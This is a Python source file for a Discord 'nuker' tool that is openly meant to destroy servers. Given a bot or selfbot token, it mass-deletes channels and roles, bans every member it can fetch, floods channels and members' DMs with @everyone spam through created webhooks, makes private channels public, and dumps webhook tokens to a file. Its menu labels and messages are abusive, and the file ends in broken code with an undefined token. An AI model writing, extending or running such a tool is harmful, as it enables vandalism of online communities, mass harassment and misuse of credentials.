import os
import sys
import threading
import json
import time
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests_futures.sessions import FuturesSession
from pystyle import Colorate, Colors, Center, Col
from colorama import Fore, init
from random import choice as choisex

init(autoreset=True)

RED    = Fore.RED
RESET  = Fore.RESET
WHITE  = Fore.WHITE
CYAN   = Fore.CYAN
YELLOW = Fore.WHITE
GREEN  = Fore.GREEN
BLUE   = Fore.BLUE
ORANGE = Fore.WHITE

token = ""
headers = {}
selected_guild_id = ""
invite_link = "discord.gg/pyy"
names = ["H2cked By T3B and Zilks", " زلكس اداة تعب !", "H2cked By T3b And Zilks ", " بابا زلكس مر من هنا "]
amount = 100

import requests
session = FuturesSession(max_workers=200)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def ask(prompt):
    return input(f" {RED}┌──[{WHITE}?{RED}]{RESET} {prompt}")

def print_menu(guild_name, guild_id):
    clear_screen()
    print(f"\n {RED}┌─────────────────────────────────────────────────────────────────────────────┐")
    print(f" {RED}│{RESET}  Server: {WHITE}{guild_name[:28]:<28}{RED} │{RESET}  ID: {WHITE}{guild_id:<20}{RED} │")
    print(f" {RED}└─────────────────────────────────────────────────────────────────────────────┘")

    options = [
        "01. FuckChannels",
        "02. FuckRoles",
        "03. RapeMembers",
        "04. NewChannels",
        "05. NewRoles",
        "06. SpamHook",
        "07. Bypasser",
        "08. Destroy",
        "09. MassDM",
        "10. Credits",
        "11. SafeRoles",
        "12. DumpWebhooks",
        "13. PublicAll",
        "14. GrabSetup",
        "15. MakeWebhooks",
        "16. InviteUnban",
    ]

    col_width = 22
    term_width = 79
    left_pad = " " * ((term_width - col_width * 2) // 2)
    print()
    for i in range(0, len(options), 2):
        left  = options[i]
        right = options[i+1] if i+1 < len(options) else ""
        print(f"{left_pad}{ORANGE}{left:<{col_width}}{right}")
    print()

    print(f"  {RED}[{WHITE}S{RED}]{RESET} Change Server   {RED}[{WHITE}0{RED}]{RESET} Exit")

class Nuker:
    @staticmethod
    def delete_channel(c_id):
        requests.delete(f"https://discord.com/api/v10/channels/{c_id}", headers=headers)

    @staticmethod
    def public_channel(c_id, guild_id):
        requests.delete(
            f"https://discord.com/api/v10/channels/{c_id}/permissions/{guild_id}",
            headers=headers
        )
        requests.put(
            f"https://discord.com/api/v10/channels/{c_id}/permissions/{guild_id}",
            headers=headers,
            json={"allow": "1024", "deny": "0", "type": 0}
        )

    @staticmethod
    def create_channel(g_id, name, type=0):
        r = requests.post(f"https://discord.com/api/v10/guilds/{g_id}/channels", headers=headers, json={"name": name, "type": type})
        return r.json().get("id") if r.status_code == 201 else None

    @staticmethod
    def delete_role(g_id, r_id):
        requests.delete(f"https://discord.com/api/v10/guilds/{g_id}/roles/{r_id}", headers=headers)

    @staticmethod
    def create_role(g_id, name):
        requests.post(f"https://discord.com/api/v10/guilds/{g_id}/roles", headers=headers, json={"name": name})

    @staticmethod
    def ban(g_id, u_id):
        while True:
            r = requests.put(f"https://discord.com/api/v10/guilds/{g_id}/bans/{u_id}", headers=headers)
            if r.status_code == 429:
                wait = r.json().get("retry_after", 0.5)
                time.sleep(wait)
            else:
                break

    @staticmethod
    def bulk_ban(g_id, user_ids):
        """Returns (banned_count, failed_count, error_msg). error_msg is None on success."""
        while True:
            r = requests.post(f"https://discord.com/api/v10/guilds/{g_id}/bulk-ban", headers=headers, json={"user_ids": user_ids})
            if r.status_code == 429:
                try: wait = r.json().get("retry_after", 0.5)
                except: wait = 0.5
                time.sleep(wait)
            elif r.status_code == 200:
                data = r.json()
                return len(data.get("banned_users", [])), len(data.get("failed_users", [])), None
            else:
                try: err = r.json()
                except: err = r.text
                return 0, len(user_ids), str(err)

    @staticmethod
    def kick(g_id, u_id):
        requests.delete(f"https://discord.com/api/v10/guilds/{g_id}/members/{u_id}", headers=headers)

    @staticmethod
    def unban(g_id, u_id):
        while True:
            r = requests.delete(f"https://discord.com/api/v10/guilds/{g_id}/bans/{u_id}", headers=headers)
            if r.status_code == 429:
                try: wait = r.json().get("retry_after", 0.5)
                except: wait = 0.5
                time.sleep(wait)
            else:
                break

    @staticmethod
    def create_invite(c_id):
        r = requests.post(f"https://discord.com/api/v10/channels/{c_id}/invites", headers=headers, json={"max_age": 0, "max_uses": 0})
        if r.status_code == 200:
            return r.json().get("code")
        return None

    @staticmethod
    def rename_channel(c_id, name):
        while True:
            r = requests.patch(f"https://discord.com/api/v10/channels/{c_id}", headers=headers, json={"name": name})
            if r.status_code == 429:
                try: wait = r.json().get("retry_after", 0.5)
                except: wait = 0.5
                time.sleep(wait)
            else:
                break

    @staticmethod
    def rename_role(g_id, r_id, name):
        while True:
            r = requests.patch(f"https://discord.com/api/v10/guilds/{g_id}/roles/{r_id}", headers=headers, json={"name": name})
            if r.status_code == 429:
                try: wait = r.json().get("retry_after", 0.5)
                except: wait = 0.5
                time.sleep(wait)
            else:
                break

    @staticmethod
    def change_nick(g_id, u_id, nick):
        requests.patch(f"https://discord.com/api/v10/guilds/{g_id}/members/{u_id}", headers=headers, json={"nick": nick})

    @staticmethod
    def send_message(c_id, content):
        session.post(f"https://discord.com/api/v10/channels/{c_id}/messages", headers=headers, json={"content": content})

    @staticmethod
    def create_thread(c_id, name):
        requests.post(f"https://discord.com/api/v10/channels/{c_id}/threads", headers=headers, json={"name": name, "type": 11, "auto_archive_duration": 60})

    @staticmethod
    def create_webhook(c_id):
        while True:
            r = requests.post(f"https://discord.com/api/v10/channels/{c_id}/webhooks", headers=headers, json={"name": "T3B"})
            if r.status_code in [200, 201]:
                return f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"
            elif r.status_code == 429:
                try: wait = r.json().get("retry_after", 0.5)
                except: wait = 0.5
                time.sleep(wait)
            else:
                return None

    @staticmethod
    def send_webhook(url, content, count=5):
        payload = {"content": content, "username": "5of"}
        headers_wh = {"Content-Type": "application/json"}
        
        def response_hook(resp, *args, **kwargs):
            if resp.status_code == 429:
                retry = resp.json().get("retry_after", 1)
                time.sleep(retry)
                session.post(url, json=payload, headers=headers_wh)
                
        for _ in range(count):
            session.post(url, json=payload, headers=headers_wh, hooks={'response': response_hook})

    @staticmethod
    def remove_emoji(g_id, e_id):
        requests.delete(f"https://discord.com/api/v10/guilds/{g_id}/emojis/{e_id}", headers=headers)

    @staticmethod
    def send_dm(u_id, msg):
        r = requests.post("https://discord.com/api/v10/users/@me/channels", headers=headers, json={"recipient_id": u_id})
        if r.status_code == 200:
            requests.post(f"https://discord.com/api/v10/channels/{r.json()['id']}/messages", headers=headers, json={"content": msg})

def pick_server():
    r = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
    if r.status_code != 200: return None
    guilds = r.json()
    clear_screen()
    print(f"\n {RED}--- Servers Found: {len(guilds)} ---{RESET}")
    for i, g in enumerate(guilds):
        print(f" {RED}[{WHITE}{i+1:02}{RED}]{RESET} {g['name'][:30]:<30} {RED}({WHITE}{g['id']}{RED})")
    
    choice = ask("Select Server Number > ")
    try: return guilds[int(choice)-1]
    except: return None

def main_app():
    global token, headers, names, invite_link, amount
    clear_screen()
    token = ask("Enter Token > ")
    ttype = ask("Token Type? (1=Bot / 2=Selfbot) > ").strip()
    if ttype == "1":
        headers = {"Authorization": f"Bot {token}"}
    else:
        headers = {"Authorization": token}
    
    guild = pick_server()
    if not guild: print(f"{RED}Invalid Server!{RESET}"); time.sleep(2); return

    while True:
        print_menu(guild['name'], guild['id'])
        choice = ask("Choose > ")

        if choice == "0": break
        elif choice.lower() == "s": guild = pick_server(); continue

        if choice in ["1", "01"]:
            r = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers).json()
            if isinstance(r, list):
                for c in r: threading.Thread(target=Nuker.delete_channel, args=(c['id'],)).start()

        elif choice in ["2", "02"]:
            r = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/roles", headers=headers).json()
            if isinstance(r, list):
                for r_obj in r: threading.Thread(target=Nuker.delete_role, args=(guild['id'], r_obj['id'])).start()

        elif choice in ["3", "03"]:
            print(f" {YELLOW}[*] Fetching all members...")
            all_members = []
            
            # Method 1: standard members endpoint
            last_id = 0
            while True:
                url = f"https://discord.com/api/v10/guilds/{guild['id']}/members?limit=1000&after={last_id}"
                resp = requests.get(url, headers=headers)
                chunk = resp.json()
                if not isinstance(chunk, list) or len(chunk) == 0:
                    break
                all_members.extend(chunk)
                last_id = chunk[-1]['user']['id']
                if len(chunk) < 1000:
                    break
            
            # Method 2: guild search endpoint (selfbot-friendly)
            if len(all_members) == 0:
                print(f" {YELLOW}[*] Standard fetch returned 0 — trying search method...")
                for query in ["a","e","i","o","u","b","c","d","f","g","h","j","k","l","m","n","p","r","s","t"]:
                    url = f"https://discord.com/api/v10/guilds/{guild['id']}/members/search?query={query}&limit=1000"
                    resp = requests.get(url, headers=headers)
                    chunk = resp.json()
                    if isinstance(chunk, list):
                        for m in chunk:
                            uid = m.get('user', {}).get('id')
                            if uid and not any(x.get('user', {}).get('id') == uid for x in all_members):
                                all_members.append(m)
            
            print(f" {YELLOW}[*] Found {len(all_members)} members — Banning...")
            user_ids = [m['user']['id'] for m in all_members if m.get('user')]
            
            if not user_ids:
                print(f" {RED}[!] Could not fetch any members. Check token permissions.")
            else:
                banned = 0
                with ThreadPoolExecutor(max_workers=100) as pool:
                    futs = {pool.submit(Nuker.ban, guild['id'], uid): uid for uid in user_ids}
                    for f in as_completed(futs):
                        banned += 1
                        if banned % 50 == 0:
                            print(f" {YELLOW}[~] {banned}/{len(user_ids)} banned...")
                print(f" {GREEN}[✓] Banned {banned} members")

        elif choice in ["4", "04"]:
            c_name = ask("Channel Name > ")
            num = int(ask("How many? > ") or 50)
            for _ in range(num): threading.Thread(target=Nuker.create_channel, args=(guild['id'], c_name)).start()

        elif choice in ["5", "05"]:
            r_name = ask("Role Name > ")
            num = int(ask("How many? > ") or 50)
            for _ in range(num): threading.Thread(target=Nuker.create_role, args=(guild['id'], r_name)).start()

        elif choice in ["6", "06"]:
            msg   = ask("Spam Message > ")
            count = int(ask("Count > ") or 20)
            chs6  = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers).json()
            webhook_urls = []
            # Load webhooks from file if exists
            if os.path.exists("webhooks.txt"):
                with open("webhooks.txt", "r") as f:
                    webhook_urls = [line.strip() for line in f if line.strip()]
                print(f" {GREEN}[+] Loaded {len(webhook_urls)} webhooks from webhooks.txt")
            # If no file or empty, create webhooks automatically
            if not webhook_urls and isinstance(chs6, list):
                print(f" {YELLOW}[*] No webhooks.txt found — Creating webhooks...")
                def make_wh(chan_id):
                    url = Nuker.create_webhook(chan_id)
                    if url:
                        webhook_urls.append(url)
                threads6 = []
                for c in chs6:
                    if c.get('type') == 0:
                        t = threading.Thread(target=make_wh, args=(c['id'],))
                        t.start(); threads6.append(t)
                for t in threads6: t.join()
            # Sending via webhooks + bot
            def spam6(wh_url, chan_id):
                for _ in range(count):
                    if wh_url:
                        Nuker.send_webhook(wh_url, msg, 1)
                    if chan_id:
                        Nuker.send_message(chan_id, msg)
            if isinstance(chs6, list):
                text_chs = [c for c in chs6 if c.get('type') == 0]
                for i, wh_url in enumerate(webhook_urls):
                    chan_id = text_chs[i]['id'] if i < len(text_chs) else None
                    threading.Thread(target=spam6, args=(wh_url, chan_id)).start()
                # Channels without webhook
                for c in text_chs[len(webhook_urls):]:
                    threading.Thread(target=spam6, args=(None, c['id'])).start()

        elif choice in ["7", "07"]:
            msg = ask("Message to send > ")
            chs = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers).json()
            rls = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/roles", headers=headers).json()
            # Rename channels and roles
            if isinstance(chs, list):
                with ThreadPoolExecutor(max_workers=100) as pool:
                    for i, c in enumerate(chs):
                        pool.submit(Nuker.rename_channel, c['id'], names[i % len(names)])
            if isinstance(rls, list):
                with ThreadPoolExecutor(max_workers=100) as pool:
                    for i, r_obj in enumerate(rls):
                        pool.submit(Nuker.rename_role, guild['id'], r_obj['id'], names[i % len(names)])
            
            # Create webhook in each text channel, save to webhooks.txt, and send message
            if msg and isinstance(chs, list):
                saved_hooks = []
                lock = threading.Lock()
                def bypasser_webhook(chan_id, message):
                    wh_url = Nuker.create_webhook(chan_id)
                    if wh_url:
                        with lock:
                            saved_hooks.append(wh_url)
                        # Send 5 messages via webhook asynchronously
                        def spam_wh():
                            Nuker.send_webhook(wh_url, message, 5)
                        threading.Thread(target=spam_wh, daemon=True).start()
                    else:
                        # Fallback to normal message if webhook fails
                        def spam_msg():
                            for _ in range(5):
                                Nuker.send_message(chan_id, message)
                                time.sleep(0.3)
                        threading.Thread(target=spam_msg, daemon=True).start()

                text_chs = [c for c in chs if c.get('type') == 0]
                with ThreadPoolExecutor(max_workers=100) as pool:
                    for c in text_chs:
                        pool.submit(bypasser_webhook, c['id'], msg)
                
                if saved_hooks:
                    with open("webhooks.txt", "w") as f:
                        f.write("\n".join(saved_hooks))
                    print(f" {GREEN}[+] Saved {len(saved_hooks)} webhooks to webhooks.txt")


        elif choice in ["8", "08"]:
            custom_msg = ask("Message to Mention with > ") or "@everyone 5of TEAM IS HERE"
            print(f" {YELLOW}[*] Starting Destruction...")
            requests.patch(f"https://discord.com/api/v10/guilds/{guild['id']}", headers=headers, json={"name": "Ha2cked By 5of"})
            
            chs = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers).json()
            rls = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/roles",    headers=headers).json()
            mems = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/members?limit=1000", headers=headers).json()

            if isinstance(chs, list):
                for c in chs: threading.Thread(target=Nuker.delete_channel, args=(c['id'],)).start()
            if isinstance(rls, list):
                for r_obj in rls: threading.Thread(target=Nuker.delete_role, args=(guild['id'], r_obj['id'])).start()
            
            for i in range(100):
                def fast_nuke_task(idx):
                    c_name = names[idx % len(names)]
                    c_id = Nuker.create_channel(guild['id'], c_name)
                    if c_id:
                        def spam_task(chan_id):
                            wh_url = Nuker.create_webhook(chan_id)
                            final_msg = f"# {custom_msg} @everyone {invite_link}"
                            
                            for _ in range(2):
                                try:
                                    if wh_url: 
                                        Nuker.send_webhook(wh_url, final_msg, 5)
                                    else:
                                        Nuker.send_message(chan_id, final_msg)
                                except:
                                    pass
                                time.sleep(3)
                            
                            # Create threads in the channel (Last step after mentions)
                            for _ in range(10):
                                threading.Thread(target=Nuker.create_thread, args=(chan_id, custom_msg)).start()
                        threading.Thread(target=spam_task, args=(c_id,), daemon=True).start()
                
                threading.Thread(target=fast_nuke_task, args=(i,), daemon=True).start()
                time.sleep(0.01)

            def delayed_ban():
                time.sleep(5)
                if isinstance(mems, list):
                    user_ids = [m.get('user', {}).get('id') for m in mems if m.get('user', {}).get('id')]
                    chunks = [user_ids[i:i + 200] for i in range(0, len(user_ids), 200)]
                    for chunk in chunks:
                        threading.Thread(target=Nuker.bulk_ban, args=(guild['id'], chunk)).start()
            
            threading.Thread(target=delayed_ban).start()

        elif choice in ["9", "09"]:
            msg = ask("DM Message > ")
            print(f" {YELLOW}[*] Fetching members and sending DMs...")
            mems = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/members?limit=1000", headers=headers).json()
            if isinstance(mems, list):
                for m in mems:
                    u_id = m.get('user', {}).get('id')
                    if u_id: threading.Thread(target=Nuker.send_dm, args=(u_id, msg)).start()

        elif choice in ["10"]:
          
          print("THIS TOOLS FOR STONE TEAM ONLY IF YOU USING IT YOUR FUCKING ASS MAN")
          print("This Tool Kill The Servers - discord.gg/0-2")

        elif choice in ["11"]:
            r = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/roles", headers=headers).json()
            if not isinstance(r, list):
                print(f" {RED}[!] Failed to fetch roles")
            else:
                roles = [ro for ro in r if ro['name'] != "@everyone"]
                role_id_map = {ro['id']: ro['name'] for ro in roles}
                print(f"\n {CYAN}--- Existing Roles ({len(roles)}) ---")
                for i, ro in enumerate(roles):
                    print(f" {RED}[{WHITE}{i+1:02}{RED}]{RESET} {ro['name'][:30]:<30} {RED}({WHITE}{ro['id']}{RED})")
                print(f"\n {YELLOW}[*] Type numbers from the list (e.g. 1,3) or Role IDs directly (e.g. 149394...,150052...)")
                print(f" {YELLOW}[*] You can mix them - separated by comma")
                raw = ask("Protected Roles > ").strip()
                protected_ids = set()
                for token in raw.split(","):
                    token = token.strip()
                    if not token:
                        continue
                    # If the number is large (Direct ID)
                    if len(token) > 6 and token.isdigit():
                        if token in role_id_map:
                            protected_ids.add(token)
                            print(f" {GREEN}[~] Protected : {role_id_map[token]} ({token})")
                        else:
                            print(f" {YELLOW}[?] ID not found in server: {token} - Ignored")
                    # If the number is small = Number from the list
                    elif token.isdigit():
                        idx = int(token) - 1
                        if 0 <= idx < len(roles):
                            ro = roles[idx]
                            protected_ids.add(ro['id'])
                            print(f" {GREEN}[~] Protected : {ro['name']} ({ro['id']})")
                        else:
                            print(f" {YELLOW}[?] Number out of range: {token} - Ignored")
                print(f"\n {YELLOW}[*] Deleting...")
                deleted = 0
                skipped = 0
                for ro in roles:
                    if ro['id'] in protected_ids:
                        skipped += 1
                    else:
                        threading.Thread(target=Nuker.delete_role, args=(guild['id'], ro['id'])).start()
                        print(f" {RED}[-] Deleted : {ro['name']} ({ro['id']})")
                        deleted += 1
                print(f" {WHITE}[✓] Deleted {deleted} roles | Protected {skipped} roles")

        elif choice in ["12"]:
            print(f" {YELLOW}[*] Fetching all webhooks from the server...")
            r = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/webhooks", headers=headers)
            if r.status_code != 200:
                print(f" {RED}[!] Failed to fetch webhooks — Code: {r.status_code}")
            else:
                webhooks = r.json()
                if not isinstance(webhooks, list) or len(webhooks) == 0:
                    print(f" {YELLOW}[!] No webhooks found in this server")
                else:
                    urls = []
                    for wh in webhooks:
                        wh_id    = wh.get('id', '')
                        wh_token = wh.get('token', '')
                        if wh_id and wh_token:
                            url = f"https://discord.com/api/webhooks/{wh_id}/{wh_token}"
                            urls.append(url)
                            print(f" {GREEN}[+] {wh.get('name','?'):20} — #{wh.get('channel_id','?')} — {url}")
                    if urls:
                        with open("webhooks.txt", "w") as f:
                            f.write("\n".join(urls))
                        print(f"\n {WHITE}[✓] Saved {len(urls)} webhooks to webhooks.txt")
                    else:
                        print(f" {YELLOW}[!] Webhooks don't have tokens — You might need more permissions")

        elif choice in ["13"]:
            print(f" {YELLOW}[*] Converting all channels to public...")
            chs13 = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers).json()
            if not isinstance(chs13, list):
                print(f" {RED}[!] Failed to fetch channels")
            else:
                count13 = 0
                for c in chs13:
                    threading.Thread(target=Nuker.public_channel, args=(c['id'], guild['id'])).start()
                    count13 += 1
                print(f" {GREEN}[✓] Converted {count13} channels to public, waiting for application...")

        elif choice in ["14"]:
            print(f" {YELLOW}[*] GrabSetup — Fetching channels...")
            chs14 = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers).json()
            if not isinstance(chs14, list):
                print(f" {RED}[!] Failed — Check token and permissions")
            else:
                grabbed   = []
                grab_lock = threading.Lock()

                def grab_channel(c):
                    c_id = c['id']
                    # 1) Make channel public
                    Nuker.public_channel(c_id, guild['id'])
                    # 2) Create webhook only in text channels
                    if c.get('type') == 0:
                        wh_url = Nuker.create_webhook(c_id)
                        if wh_url:
                            with grab_lock:
                                grabbed.append(wh_url)
                            print(f" {GREEN}[+] {c.get('name','?'):25} → {wh_url}")

                threads14 = []
                for ch in chs14:
                    t = threading.Thread(target=grab_channel, args=(ch,))
                    t.start()
                    threads14.append(t)

                print(f" {CYAN}[*] Applying, please wait...")
                for t in threads14: t.join()

                if grabbed:
                    with open("webhooks.txt", "w") as f:
                        f.write("\n".join(grabbed))
                    print(f"\n {WHITE}[✓] Created {len(grabbed)} webhooks")
                    print(f" {WHITE}[✓] All saved to webhooks.txt")
                else:
                    print(f" {YELLOW}[!] Failed to create webhook — Check Manage Webhooks permission")

        elif choice in ["15"]:
            print(f" {YELLOW}[*] Creating webhooks in all channels...")
            chs15 = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers).json()
            if not isinstance(chs15, list):
                print(f" {RED}[!] Failed to fetch channels")
            else:
                mw_urls  = []
                mw_lock  = threading.Lock()
                def make_wh15(c):
                    if c.get('type') != 0:
                        return
                    wh = Nuker.create_webhook(c['id'])
                    if wh:
                        with mw_lock:
                            mw_urls.append(wh)
                        print(f" {GREEN}[+] #{c.get('name','?'):25} → {wh}")
                with ThreadPoolExecutor(max_workers=100) as pool:
                    for c in chs15:
                        pool.submit(make_wh15, c)
                
                if mw_urls:
                    with open("webhooks.txt", "w") as f:
                        f.write("\n".join(mw_urls))
                    print(f"\n {WHITE}[✓] Created {len(mw_urls)} webhooks and saved to webhooks.txt")
                else:
                    print(f" {YELLOW}[!] Failed to create webhook — Check Manage Webhooks permission")

        elif choice in ["16"]:
            print(f" {YELLOW}[*] Creating invite link...")
            chs = requests.get(f"https://discord.com/api/v10/guilds/{guild['id']}/channels", headers=headers).json()
            invite_code = None
            if isinstance(chs, list):
                for c in chs:
                    if c.get('type') == 0:  # text channel
                        invite_code = Nuker.create_invite(c['id'])
                        if invite_code:
                            break
            
            if invite_code:
                print(f" {GREEN}[+] Invite Link: https://discord.gg/{invite_code}")
            else:
                print(f" {RED}[!] Failed to create invite link. Continuing anyway...")
            
            do_unban = ask("Do you want to unban everyone? (y/n) > ").strip().lower()
            if do_unban in ['y', 'yes', 'نعم', 'يب', 'ي']:
                print(f" {YELLOW}[*] Fetching bans...")
                all_bans = []
                last_id = 0
                while True:
                    url = f"https://discord.com/api/v10/guilds/{guild['id']}/bans?limit=1000"
                    if last_id:
                        url += f"&after={last_id}"
                    resp = requests.get(url, headers=headers)
                    chunk = resp.json()
                    if not isinstance(chunk, list) or len(chunk) == 0:
                        break
                    all_bans.extend(chunk)
                    last_id = chunk[-1]['user']['id']
                    if len(chunk) < 1000:
                        break
                
                print(f" {YELLOW}[*] Found {len(all_bans)} bans. Unbanning...")
                user_ids = [b['user']['id'] for b in all_bans if b.get('user')]
                if not user_ids:
                    print(f" {YELLOW}[!] No bans found or lack permissions.")
                else:
                    unbanned = 0
                    with ThreadPoolExecutor(max_workers=100) as pool:
                        futs = {pool.submit(Nuker.unban, guild['id'], uid): uid for uid in user_ids}
                        for f in as_completed(futs):
                            unbanned += 1
                            if unbanned % 50 == 0:
                                print(f" {YELLOW}[~] {unbanned}/{len(user_ids)} unbanned...")
                    print(f" {GREEN}[✓] Unbanned {unbanned} members")

        ask("\n Done. Press Enter...")

if __name__ == "__main__":
   

bot.run(TOKEN)
